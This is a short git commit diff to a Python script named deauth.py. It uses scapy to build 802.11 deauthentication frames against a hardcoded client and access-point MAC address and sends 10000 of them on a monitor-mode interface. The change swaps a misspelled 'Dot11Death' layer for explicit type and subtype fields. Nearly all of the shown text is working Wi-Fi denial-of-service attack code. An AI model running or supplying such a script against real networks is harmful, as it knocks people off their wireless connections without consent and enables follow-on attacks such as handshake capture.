8544820d5058c580fd77ee1c20c8a8286c483ebd
Muhammetcanpolat <73015593+mmc6185@users.noreply.github.com>
2023-09-23 10:25:23 +0300

    Update deauth.py

--- deauth.py
+++ deauth.py
@@ -6,6 +6,6 @@ target_mac = "98:F6:21:83:ED:E0"
 ap_mac = "00:5F:67:31:1C:F6"
 
 
-deauth_packet = scapy.RadioTap() / scapy.Dot11(addr1 = target_mac, addr2 = sys.argv[1], addr3 = sys.argv[1]) / scapy.Dot11Death()
+deauth_packet = scapy.RadioTap() / scapy.Dot11(type = 0, subtype = 12, addr1 = target_mac, addr2 = sys.argv[1], addr3 = sys.argv[1]) 
 
 sendp(deauth_packet, iface="wlan0mon", count = 10000, inter = .2)
